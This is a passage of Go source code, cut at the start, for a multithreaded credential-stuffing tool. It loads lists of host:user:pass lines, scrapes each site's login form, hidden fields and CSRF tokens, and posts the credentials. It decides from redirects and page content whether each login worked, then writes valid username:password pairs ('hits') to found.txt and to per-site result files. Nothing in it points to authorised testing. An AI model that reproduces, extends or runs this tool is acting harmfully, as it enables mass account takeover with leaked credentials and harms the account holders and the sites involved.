		locPath := strings.TrimRight(locU.Path, "/")
		postPath := strings.TrimRight(postU.Path, "/")
		if strings.EqualFold(locU.Host, postU.Host) && strings.EqualFold(locPath, postPath) {
			return true
		}
	}
	if badRedirectQueryRe.MatchString(location) {
		return true
	}
	return false
}

var loginPathRe = regexp.MustCompile(`(?i)/(login|log.?in|signin|sign.?in|logon|wp-login\.php|users/sign_in|account/login|user/login|member/login|admin/login|session/new)([/?#]|$)`)

func isLoginURL(rawURL string) bool {
	return loginPathRe.MatchString(rawURL)
}

type Result struct {
	Cred    Credential
	Status  string
	Details string
}

var (
	totalFound  atomic.Int64
	totalFail   atomic.Int64
	totalNoForm atomic.Int64
	totalErr    atomic.Int64
	debugMode   bool
)

func processCredential(c Credential) Result {
	getClient, err := newGETClient()
	if err != nil {
		totalErr.Add(1)
		return Result{Cred: c, Status: "ERROR", Details: err.Error()}
	}

	_, body, cookies, err := doGET(getClient, c.URL)
	if err != nil {
		totalErr.Add(1)
		return Result{Cred: c, Status: "ERROR", Details: fmt.Sprintf("GET: %v", err)}
	}

	tags := parseInputTags(body)
	if !hasLoginForm(tags) {
		if debugMode {
			slug := regexp.MustCompile(`[^a-zA-Z0-9]`).ReplaceAllString(c.Host, "_")
			fname := "debug_" + slug + ".html"
			os.WriteFile(fname, []byte(body), 0644)
			fmt.Printf("\r[DEBUG] dumped GET response → %s\n", fname)
		}
		totalNoForm.Add(1)
		return Result{Cred: c, Status: "NO_FORM", Details: "no email/pass form detected"}
	}

	emailField, passField := fieldNames(tags)
	action := resolveAction(c.URL, extractFormAction(body))
	hidden := hiddenFields(tags)
	extractAllTokens(body, hidden)

	formData := url.Values{}
	for k, v := range hidden {
		formData.Set(k, v)
	}
	formData.Set(emailField, c.User)
	formData.Set(passField, c.Password)

	postClient, err := newPOSTClient()
	if err != nil {
		totalErr.Add(1)
		return Result{Cred: c, Status: "ERROR", Details: err.Error()}
	}

	pr, err := doPOST(postClient, action, formData, cookies, c.URL)
	if err != nil {
		totalErr.Add(1)
		return Result{Cred: c, Status: "ERROR", Details: fmt.Sprintf("POST: %v", err)}
	}

	allCookies := append(cookies, pr.cookies...)

	judgeBody := pr.body
	judgeCode := pr.code
	judgeURL := ""

	if (pr.code == 301 || pr.code == 302 || pr.code == 303 || pr.code == 307 || pr.code == 308) && pr.location != "" {
		loc := resolveAction(action, pr.location)
		judgeURL = loc

		if isBadRedirect(loc, c.URL) {
			if debugMode {
				slug := regexp.MustCompile(`[^a-zA-Z0-9]`).ReplaceAllString(c.Host, "_")
				fname := "debug_fail_" + slug + ".html"
				os.WriteFile(fname, []byte(pr.body), 0644)
				fmt.Printf("\r[DEBUG] bad redirect → %s  dumped → %s\n", loc, fname)
			}
			totalFail.Add(1)
			return Result{Cred: c, Status: "FAIL", Details: fmt.Sprintf("HTTP %d → bad redirect → %s", pr.code, loc)}
		}

		getClient2, err2 := newGETClient()
		if err2 == nil {
			_, b2, _, rerr2 := doGETWithCookies(getClient2, loc, allCookies)
			if rerr2 == nil {
				judgeBody = b2
				judgeCode = 200
				landedTags := parseInputTags(b2)
				if hasLoginForm(landedTags) {
					decoded := decodeHTML(b2)
					for _, p := range failPatterns {
						if p.MatchString(decoded) {
							if debugMode {
								slug := regexp.MustCompile(`[^a-zA-Z0-9]`).ReplaceAllString(c.Host, "_")
								fname := "debug_fail_" + slug + ".html"
								os.WriteFile(fname, []byte(b2), 0644)
								fmt.Printf("\r[DEBUG] landed on login page with error → %s\n", fname)
							}
							totalFail.Add(1)
							return Result{Cred: c, Status: "FAIL", Details: fmt.Sprintf("HTTP %d → login page with error", pr.code)}
						}
					}
					totalFail.Add(1)
					return Result{Cred: c, Status: "FAIL", Details: fmt.Sprintf("HTTP %d → redirected back to login form", pr.code)}
				}
			}
		}
	}

	if isSuccess(judgeCode, judgeBody) {
		totalFound.Add(1)
		detail := fmt.Sprintf("HTTP %d  [email=%s pass=%s]", pr.code, emailField, passField)
		if judgeURL != "" {
			detail += "  → " + judgeURL
		}
		return Result{Cred: c, Status: "FOUND", Details: detail}
	}

	if debugMode {
		slug := regexp.MustCompile(`[^a-zA-Z0-9]`).ReplaceAllString(c.Host, "_")
		fname := "debug_fail_" + slug + ".html"
		os.WriteFile(fname, []byte(judgeBody), 0644)
		fmt.Printf("\r[DEBUG] dumped FAIL response → %s\n", fname)
	}
	totalFail.Add(1)
	return Result{Cred: c, Status: "FAIL", Details: fmt.Sprintf("HTTP %d  [email=%s pass=%s]", pr.code, emailField, passField)}
}

const (
	colorReset  = "\033[0m"
	colorGreen  = "\033[32m"
	colorRed    = "\033[31m"
	colorYellow = "\033[33m"
	colorCyan   = "\033[36m"
	colorGray   = "\033[90m"
)

var allLog *bufio.Writer

func logAll(r Result) {
	if allLog == nil {
		return
	}
	var line string
	switch r.Status {
	case "FOUND":
		line = fmt.Sprintf("%s:%s | %s | HIT | %s\n", r.Cred.User, r.Cred.Password, r.Cred.URL, r.Details)
	case "NO_FORM":
		line = fmt.Sprintf("%s:%s | %s | SKIP | %s\n", r.Cred.User, r.Cred.Password, r.Cred.URL, r.Details)
	case "FAIL":
		line = fmt.Sprintf("%s:%s | %s | FAIL | %s\n", r.Cred.User, r.Cred.Password, r.Cred.URL, r.Details)
	case "ERROR":
		line = fmt.Sprintf("%s:%s | %s | ERR | %s\n", r.Cred.User, r.Cred.Password, r.Cred.URL, r.Details)
	}
	allLog.WriteString(line)
	allLog.Flush()
}

func printResult(r Result, total, done int) {
	ts := time.Now().Format("15:04:05")
	switch r.Status {
	case "FOUND":
		fmt.Printf("\r%s[%s]%s %s[FOUND]%s  %s  %s:%s  (%s)\n",
			colorGray, ts, colorReset,
			colorGreen, colorReset,
			r.Cred.URL, r.Cred.User, r.Cred.Password, r.Details)
	case "NO_FORM":
		fmt.Printf("\r%s[%s]%s %s[SKIP] %s  %s  (%s)\n",
			colorGray, ts, colorReset,
			colorYellow, colorReset,
			r.Cred.URL, r.Details)
	case "FAIL":
		fmt.Printf("\r%s[%s]%s %s[FAIL] %s  %s  %s  (%s)\n",
			colorGray, ts, colorReset,
			colorRed, colorReset,
			r.Cred.URL, r.Cred.User, r.Details)
	case "ERROR":
		fmt.Printf("\r%s[%s]%s %s[ERR]  %s  %s  (%s)\n",
			colorGray, ts, colorReset,
			colorCyan, colorReset,
			r.Cred.URL, r.Details)
	}
	fmt.Printf("\r%s[=]%s %d/%d  Found:%s%d%s  Fail:%s%d%s  Skip:%s%d%s  Err:%s%d%s   ",
		colorCyan, colorReset, done, total,
		colorGreen, totalFound.Load(), colorReset,
		colorRed, totalFail.Load(), colorReset,
		colorYellow, totalNoForm.Load(), colorReset,
		colorCyan, totalErr.Load(), colorReset,
	)
}

func main() {
	filePath := flag.String("f", "", "Credentials file (host:user:pass per line)")
	threads := flag.Int("t", 0, "Concurrent threads (prompted if not set)")
	outFile := flag.String("o", "found.txt", "Output file for hits")
	debug := flag.Bool("debug", false, "Dump raw GET/FAIL response HTML to debug_*.html")
	flag.Parse()
	debugMode = *debug

	sc := bufio.NewScanner(os.Stdin)

	if *filePath == "" {
		fmt.Print("Enter credentials file path: ")
		sc.Scan()
		*filePath = strings.TrimSpace(sc.Text())
	}
	if *filePath == "" {
		fmt.Fprintln(os.Stderr, "error: no file path provided")
		os.Exit(1)
	}

	if *threads <= 0 {
		fmt.Print("Enter number of threads: ")
		sc.Scan()
		n := 0
		fmt.Sscan(strings.TrimSpace(sc.Text()), &n)
		if n <= 0 {
			n = 10
		}
		*threads = n
	}

	fmt.Printf("%s[*]%s Loading: %s\n", colorCyan, colorReset, *filePath)
	creds, err := loadAndClean(*filePath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		os.Exit(1)
	}
	if len(creds) == 0 {
		fmt.Println("No valid admin credentials found after filtering.")
		os.Exit(0)
	}
	if err := writeBack(*filePath, creds); err != nil {
		fmt.Fprintf(os.Stderr, "warning: could not update input file: %v\n", err)
	}
	fmt.Printf("%s[*]%s %d lines after clean  |  threads=%d  |  out=%s\n\n",
		colorCyan, colorReset, len(creds), *threads, *outFile)

	if err := os.MkdirAll("results", 0755); err != nil {
		fmt.Fprintf(os.Stderr, "error creating results dir: %v\n", err)
		os.Exit(1)
	}

	hitsF, err := os.OpenFile(*outFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error opening output: %v\n", err)
		os.Exit(1)
	}
	defer hitsF.Close()
	hitsW := bufio.NewWriter(hitsF)

	allLogF, err := os.OpenFile("all.log", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error opening all.log: %v\n", err)
		os.Exit(1)
	}
	defer allLogF.Close()
	allLog = bufio.NewWriter(allLogF)

	var resultsMu sync.Mutex
	siteFiles := map[string]*os.File{}

	jobs := make(chan Credential, *threads*2)
	results := make(chan Result, *threads*2)
	var wg sync.WaitGroup

	for i := 0; i < *threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for c := range jobs {
				results <- processCredential(c)
			}
		}()
	}
	go func() {
		for _, c := range creds {
			jobs <- c
		}
		close(jobs)
	}()
	go func() {
		wg.Wait()
		close(results)
	}()

	slugRe := regexp.MustCompile(`[^a-zA-Z0-9\-]`)

	writeHit := func(r Result) {
		line := fmt.Sprintf("%s:%s | %s\n", r.Cred.User, r.Cred.Password, r.Cred.URL)

		fmt.Fprint(hitsW, line)
		hitsW.Flush()

		slug := slugRe.ReplaceAllString(r.Cred.Host, "_")
		fname := "results/valid_" + slug + ".txt"
		resultsMu.Lock()
		f, ok := siteFiles[fname]
		if !ok {
			var err error
			f, err = os.OpenFile(fname, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
			if err == nil {
				siteFiles[fname] = f
			}
		}
		if f != nil {
			fmt.Fprint(f, line)
		}
		resultsMu.Unlock()
	}

	defer func() {
		resultsMu.Lock()
		for _, f := range siteFiles {
			f.Close()
		}
		resultsMu.Unlock()
	}()

	done := 0
	total := len(creds)
	for r := range results {
		done++
		printResult(r, total, done)
		logAll(r)
		if r.Status == "FOUND" {
			writeHit(r)
		}
	}

	fmt.Printf("\n\n%s[+]%s Done  Found=%s%d%s  Fail=%d  Skip=%d  Errors=%d\n",
		colorGreen, colorReset,
		colorGreen, totalFound.Load(), colorReset,
		totalFail.Load(),
		totalNoForm.Load(),
		totalErr.Load(),
	)
}
